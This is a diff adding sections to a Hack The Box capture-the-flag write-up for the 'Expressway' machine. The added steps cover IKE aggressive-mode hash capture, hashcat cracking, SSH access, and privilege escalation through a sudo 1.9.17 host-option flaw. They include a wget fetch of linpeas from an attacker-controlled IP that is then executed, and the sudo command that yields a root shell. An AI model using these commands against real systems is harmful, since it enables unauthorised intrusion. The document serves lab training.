@@ -14,6 +14,8 @@ Enumeration → TFTP enumeration -> IKE enumeration → credentials → privileg
 
 ---
 
+## Enumeration
+
 We start enumeration with nmap to get open ports:
 
 ```bash
@@ -58,13 +60,27 @@ Inside we can get an username named ike.
 
 Now we have an username but don't have a password so let's go to find it. If we go back to nmap enumeration results we have another port to can enumerate, port 500 (IKE), searching in Google we find the tool ike-scan.
 
+```bash
+ike-scan -M 10.10.11.87
+```
+
 ![IKE scan 1](../../assets/images/platform/hackthebox/expressway/ike-scan-1.jpg){ width=600 loading=lazy }
 
 With this result we have useful fingerprint that says to us the encryption (SHA1) and the auth (PSK). Using other parameters we get a hash, saving this hash to a new file, using hashcatd with the IKE mode (5400) we get the freakingrockstarontheroad password.
 
+```bash
+ike-scan -P -M -A -n identifier 10.10.11.87
+```
+
 ![IKE scan 2](../../assets/images/platform/hackthebox/expressway/ike-scan-2.jpg){ width=600 loading=lazy }
 
+```bash
+hashcat -m 5400 hash.txt /usr/share/wordlist/rockyou.txt
+```
+
 ![Hashcat](../../assets/images/platform/hackthebox/expressway/hashcat.jpg){ width=600 loading=lazy }
+
+## User flag
 
 With the username ike and this password we go to enter in the server using ssh to get the user flag.
 
@@ -72,5 +88,69 @@ With the username ike and this password we go to enter in the server using ssh t
 
 ![User flag](../../assets/images/platform/hackthebox/expressway/user-flag.jpg){ width=600 loading=lazy }
 
+## Privilege escalation
+
+To escalate the pivileges we can start seeing sudo permissions but we don't have anything here.
+
+```bash
+sudo -l
+```
+
+![Sudo permissions](../../assets/images/platform/hackthebox/expressway/sudo-l.jpg){ width=600 loading=lazy }
+
+Next step is check who are us and the group we are of, and with this information find directories of our group.
+
+```bash
+id
+find / -group proxy -type d 2> /dev/null
+```
+
+![Group folders](../../assets/images/platform/hackthebox/expressway/group-folders.jpg){ width=600 loading=lazy }
+
+We navigate to squid logs folder and check access.log.1. Inside we find a expressway subdomain (offramp.expressway.htb), maybe useful later but nothing more interesting.
+
+![Squid](../../assets/images/platform/hackthebox/expressway/squid.jpg){ width=600 loading=lazy }
+
+![Subdomain](../../assets/images/platform/hackthebox/expressway/subdomain.jpg){ width=600 loading=lazy }
+
+Now it's time to execute linpeas, for that we start a python server in our machine, download the script in the /tmp folder of the server, give permissions and execute it.
+
+```bash
+cd /tmp
+wget 'http://10.10.15.76:2133/linpeas.sh'
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+![Python server](../../assets/images/platform/hackthebox/expressway/python-server.jpg){ width=600 loading=lazy }
+
+![Linpeas download](../../assets/images/platform/hackthebox/expressway/linpeas-download.jpg){ width=600 loading=lazy }
+
+Once executed we can see an interesting phrase saying 'Check if the sudo version is vulnerable'.
+
+![Linpeas](../../assets/images/platform/hackthebox/expressway/linpeas.webp){ width=600 loading=lazy }
+
+Sudo version is 1.9.17 and search in Exploitdb we can see that is vulnerable (https://www.exploit-db.com/exploits/52354) and we can exploit it.
+
+To can exploit we need a subdomain, we use the offramp subdomain we found before.
+
+
+```bash
+sudo -l -h offramp.expressway.htb
+```
+
+![Sudo exploit 1](../../assets/images/platform/hackthebox/expressway/sudo-exploit-1.jpg){ width=600 loading=lazy }
+
+The results says that we can do everything as root in the offramp subdomain so we open a shell as root in this subdomain adding -i parameter to previous command.
+
+```bash
+sudo -h offramp.expressway.htb -i
+```
+
+Once we are root we get the root flag and complete the machine.
+
+![Root flag](../../assets/images/platform/hackthebox/expressway/root-flag.jpg){ width=600 loading=lazy }
+
+![Pwned](../../assets/images/platform/hackthebox/expressway/pwned.jpg){ width=600 loading=lazy }
 
 **Disclaimer:** This write-up documents a retired/hypothetical lab. Do not use these techniques against systems you do not own or have explicit permission to test.
